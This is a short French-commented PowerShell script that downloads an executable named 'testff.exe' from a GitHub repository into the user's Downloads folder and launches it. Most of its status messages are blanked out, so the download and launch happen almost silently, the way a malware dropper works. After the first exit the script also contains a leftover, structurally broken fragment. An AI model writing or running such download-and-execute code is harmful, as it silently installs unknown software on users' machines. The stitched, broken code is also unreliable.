# Définir l'URL du fichier à télécharger
$url = "https://github.com/ExoTiiCk/Nouveau-dossier-2-/raw/refs/heads/main/testff.exe"

# Obtenir le nom d'utilisateur actuel
$userProfile = [System.Environment]::GetFolderPath("UserProfile")

# Définir le chemin local dans le dossier "Téléchargements"
$localPath = "$userProfile\Downloads\testff.exe"

# Fonction pour afficher l'emplacement du fichier
function Show-FileLocation {
    param (
        [string]$filePath
    )
    Write-Output ""
}

# Afficher le chemin de téléchargement
Write-Output ""

# Créer le répertoire "Téléchargements" s'il n'existe pas
if (-Not (Test-Path -Path "$userProfile\Downloads")) {
    New-Item -ItemType Directory -Path "$userProfile\Downloads"
    Write-Output ""
}

# Télécharger le fichier avec Invoke-WebRequest
try {
    Invoke-WebRequest -Uri $url -OutFile $localPath
    Write-Output "Le fichier a été téléchargé avec succès."
    Show-FileLocation -filePath $localPath
} catch {
    Write-Output ""
}

# Vérifier si le fichier a été téléchargé avec succès
if (Test-Path $localPath) {
    Write-Output ""

    # Lancer le fichier exécutable
    try {
        Start-Process -FilePath $localPath
        Write-Output ""
    } catch {
        Write-Output ""
    }
} else {
    Write-Output ""
}

exit

    } catch {
        Write-Output "Erreur lors de l'exécution du fichier : $_"
    }
} else {
    Write-Output "Le fichier n'a pas été téléchargé correctement."
}

# Fermer la fenêtre PowerShell
Write-Output "Fermeture de la fenêtre PowerShell..."
Start-Sleep -Seconds 2  # Attendre 2 secondes avant de fermer la fenêtre
exit
